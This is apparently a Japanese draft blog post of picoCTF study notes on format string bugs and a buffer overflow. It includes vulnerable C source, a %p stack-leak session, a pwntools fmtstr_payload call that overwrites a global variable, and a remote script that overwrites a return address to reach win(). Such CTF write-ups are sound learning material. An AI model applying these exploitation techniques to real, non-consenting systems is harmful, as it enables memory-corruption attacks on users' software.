---
title: "pico - pwn1"
date: 2024-05-04T16:07:24+09:00
draft: true
---

pwn 何もできないので真面目にやりながらまとめる．
6月までに基本的なやつはやれたらいいなの気持ち

## format string Bug

FSB は，フォーマット文字列を扱う関数(```printf```) に起因する脆弱性．
例えば以下のような使い方を考える．

```C
printf("%s", msg);
```

一方で，攻撃者側が任意のデータを入力できる場合，例えば以下のような場合は話が変わってくる．

```C
printf(msg)
```

基本的に ```printf``` は %s, %x みたいなフォーマットを見つけるとスタックからデータを読み込んで処理する．
特に x64 の環境では関数への引数はレジスタとスタックで渡される．
整数の引数の順番は ```RDI, RSI, RDX, RCX, ...``` という順番になっている．

ここで，例えば msg に "%s, %s" などと入れることができれば，レジスタの ```RSI, RDX``` が参照される．
(RDI には "%s, %s" が入る．)

### format string 0

```C
char choice1[BUFSIZE];
scanf("%s", choice1);
```

入力を受け取る部分がこのような記述になっている．
また，フラグは以下のようなコードで表示される．

```C
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int main(~~){
~~ snip ~~
    signal(SIGSEGV, sigsegv_handler);
~~ snip ~~
}
```

なので，SIGSEGV（セグフォ）を発生させればいいということになる．
そこで，BUFSIZE を超える入力を入れることで例外を発生させる．

### format string 1

```%n$p```

### format string 2

```C
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

sus の値を書きかえる必要がある．
で，FSB で書き換えられるのは ```%n``` なので，これを使う．

pwntool の ```fmtstr_payload``` がこれを提供してくれる．
```fmtstr_payload(offset, {address:value}, numbwritten=0, write_size='short')```

- offset: フォーマット文字列のオフセット
  - %p をリトルエンディアンで 0x7025702570257025 なのでオフセットは 14

```shell
┌──(kali㉿kali)-[~/CTF]
└─$ nc rhea.picoctf.net 52736
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's your input: 0x402075(nil)0x74cc57485a00(nil)0x1ff32b00x74cc574d7af00x74cc574ae4e80x90x74cc574aede90x74cc5727f0980x74cc5749b4d0(nil)0x7ffcfdf96ab00x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x74cc570070250x74cc574d86500x74cc5749d000
sus = 0x21737573
You can do better!
```

- address: 書き込み先のアドレス
  - checksec で PIE が無効なので，アドレスは固定されている．
  - sus: 0x404060

```shell
pwndbg> p &sus
$1 = (<data variable, no debug info> *) 0x404060 <sus>
```

- value: 書き込みたい内容(0x67616c66)

```C
from pwn import *

context.arch='amd64'
print(fmtstr_payload(14, {0x404060:0x67616c66}, numbwritten=0, write_size='byte').decode('utf-8'))
```

### buffer overflow 1

```C
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

```shell
└─$ file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, not stripped
```

32-bit であることを知らずに10年溶かしました．

```python
from pwn import *

r = remote("saturn.picoctf.net", 53617)
win_addr = 0x80491f6

r.recvuntil(b'string:')
payload = b'a'*(32+12) + p32(win_addr)
r.sendline(payload)
res = r.recvall()
print(res)
```
